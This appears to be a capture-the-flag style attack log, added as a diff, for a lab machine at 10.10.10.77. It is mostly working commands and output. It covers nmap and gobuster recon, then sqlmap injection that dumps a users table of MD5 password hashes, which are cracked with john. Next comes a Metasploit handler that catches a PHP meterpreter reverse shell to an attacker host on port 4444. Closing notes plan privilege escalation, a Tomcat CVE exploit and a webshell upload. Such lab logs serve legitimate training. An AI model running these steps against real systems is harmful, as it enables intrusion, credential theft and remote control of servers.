@@ -1,0 +1,80 @@
+# Multi-tool session against 10.10.10.77 – 2026-04-15
+# Mix of nmap, gobuster, sqlmap, and metasploit usage
+
+## Phase 1 – Recon
+
+$ nmap -sV -sC 10.10.10.77
+Starting Nmap 7.94
+Nmap scan report for 10.10.10.77
+Host is up.
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Apache httpd 2.4.38
+443/tcp  open  ssl/http Apache httpd 2.4.38
+8080/tcp open  http     Apache Tomcat 9.0.14
+
+Nmap done: 1 IP address (1 host up) scanned in 8.21 seconds
+
+## Phase 2 – Web enumeration
+
+$ gobuster dir -u http://10.10.10.77/ -w /usr/share/wordlists/dirb/big.txt -x php,html
+Dir Mode:
+/index.php            (Status: 200) [Size: 4200]
+/login.php            (Status: 200) [Size: 1500]
+/admin                (Status: 301) [Size: 320]
+/upload               (Status: 200) [Size: 800]
+
+## Phase 3 – SQL injection testing
+
+$ sqlmap -u "http://10.10.10.77/login.php?user=admin&pass=test" --dbs --batch
+testing for SQL injection
+[INFO] GET parameter 'user' is 'MySQL >= 5.6 AND time-based blind' injectable
+available databases [3]:
+[*] information_schema
+[*] mysql
+[*] webapp
+
+$ sqlmap -u "http://10.10.10.77/login.php?user=admin&pass=test" -D webapp --tables --batch
+Database: webapp
+[2 tables]
++----------+
+| users    |
+| products |
++----------+
+
+$ sqlmap -u "http://10.10.10.77/login.php?user=admin&pass=test" -D webapp -T users --dump --batch
+[INFO] fetched data logged to txt files
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| 2  | bob      | 1a1dc91c907325c69271ddf0c944bc72 |
++----+----------+----------------------------------+
+
+# Found MD5 hashes – need to crack them
+# NOTE: 5f4dcc3b5aa765d61d8327deb882cf99 = "password" (common MD5)
+
+$ echo "5f4dcc3b5aa765d61d8327deb882cf99" | john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt -
+
+## Phase 4 – Exploitation
+
+$ msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set LHOST 10.10.14.5
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > set PAYLOAD php/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.5:4444
+[*] Sending stage (39927 bytes) to 10.10.10.77
+[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.77:49232)
+
+meterpreter > shell
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+## Notes
+
+# TODO: Privilege escalation – check SUID binaries, sudo -l
+# TODO: Look for user.txt flag in /home directories
+# INVESTIGATE: Tomcat on 8080 – test for CVE-2019-0232 or default creds
+# CHECK: whether /upload directory allows arbitrary file upload (webshell)
